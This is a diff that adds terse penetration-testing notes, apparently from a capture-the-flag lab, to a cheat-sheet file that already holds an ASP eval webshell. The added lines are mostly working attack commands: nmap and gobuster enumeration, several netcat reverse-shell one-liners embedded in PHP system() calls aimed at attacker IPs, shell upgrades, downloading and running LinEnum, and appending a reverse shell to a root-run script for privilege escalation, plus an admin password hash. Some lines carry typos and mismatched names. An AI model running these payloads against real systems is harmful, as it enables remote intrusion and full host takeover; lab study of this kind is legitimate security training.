@@ -106,3 +106,75 @@ asp = <% eval request("cmd") %>
 
 ##### Connect to VPN
 > sudo openvpn user.ovpn
+
+  _______________________
+  
+
+nmap -sV --open -oA nibbles_initial_scan <ip address>
+nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
+nc -nv 10.129.42.190 22
+nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
+nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 
+whatweb 10.129.42.190
+
+
+gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.246 9443 >/tmp/f"); ?>
+nc -lvnp 9443
+python -c 'import pty; pty.spawn("/bin/bash")'
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+unzip personal.zip
+cat monitor.sh
+sudo python3 -m http.server 8080
+wget http://<your ip>:8080/LinEum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+
+https://github.com/vanhauser-thc/thc-hydra
+https://github.com/digininja/CeWL
+https://highon.coffee/blog/reverse-shell-cheat-sheet/!
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9443 >/tmp/f"); ?>
+nc -lvnp 9443
+navigate to the webfile and should get a hit on the listner as shell
+upgrade to nicer shell via which python3 commmand
+python -c 'import pty; pty.spawn("/bin/bash")' OR python -c 'import pty; pty.spawn("/bin/bash")' OR python3 -c 'import pty; pty.spawn("/bin/bash")'
+to enumerate priv esculations run this while listening - sudo python3 -m http.server 8080
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Back on the target type wget http://<your ip>:8080/LinEum.sh to download the script
+Once the script is pulled over, type chmod +x LinEnum.sh to make the script executable and then type ./LinEnum.sh to run it.
+modify monitor.py script to add line at the end
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 8443 >/tmp/f' | tee -a monitor.sh
+
+
+10.129.42.249 target
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+/theme
+/data
+/backups
+{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
+10.10.15.24 me
+<USR>admin</USR>
+<NAME/>
+<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
+<EMAIL>admin@gettingstarted.com</EMAIL>
+
+nmap -sV --open -oA nibbles_initial_scan 10.129.42.249 
+nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.249 
+
+nc -nv 10.129.42.249 22
+nc -nv 10.129.42.249 80
+
+nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.249
+nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.249
+
+whatweb 10.129.42.249
+gobuster dir -u http://10.129.42.249/data/ --wordlist /usr/share/dirb/wordlists/common.txt
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.129.42.249 4444 >/tmp/f"); ?>
